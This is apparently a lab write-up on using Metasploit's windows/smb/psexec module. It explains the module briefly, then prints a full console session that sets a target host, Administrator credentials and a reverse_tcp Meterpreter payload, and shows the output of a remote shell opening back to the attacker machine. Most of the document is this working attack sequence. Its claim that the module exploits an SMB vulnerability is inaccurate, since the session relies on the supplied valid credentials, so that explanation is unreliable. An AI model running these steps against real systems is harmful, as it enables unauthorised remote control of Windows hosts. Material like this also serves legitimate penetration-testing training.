# Using psexec module 
- The "windows/smb/psexec" module is a module in the Metasploit Framework that enables an attacker to execute commands or upload payloads on a remote Windows host using the PsExec utility. 
- PsExec is a command-line utility that allows users to run commands on remote Windows system, and it is commonly used by system administors to perform tasks on remote machines. However, attackers can also use PsExec to run malicious code on remote machines.
- The "windows/smb/psexec" module in Metasploit leverages a vulnerability in the Windows SMB protocol to enable an attacker to execute arbitrary commands on a remote Windows host using PsExec. 

## Code - 
```python
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOST 192.168.216.11
RHOST => 192.168.216.11
msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPASS vagrant
SMBPASS => vagrant
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] 192.168.216.11:445 - Connecting to the server...
[*] 192.168.216.11:445 - Authenticating to 192.168.216.11:445 as user 'Administrator'...
[*] 192.168.216.11:445 - Selecting PowerShell target
[*] 192.168.216.11:445 - Executing the payload...
[+] 192.168.216.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] 192.168.216.11:445 - Connecting to the server...
[*] 192.168.216.11:445 - Authenticating to 192.168.216.11:445 as user 'Administrator'...
[*] 192.168.216.11:445 - Selecting PowerShell target
[*] 192.168.216.11:445 - Executing the payload...
[+] 192.168.216.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.216.11
[*] Meterpreter session 1 opened (192.168.216.9:4444 -> 192.168.216.11:49387) at 2023-03-12 12:55:44 +0530

meterpreter > 
```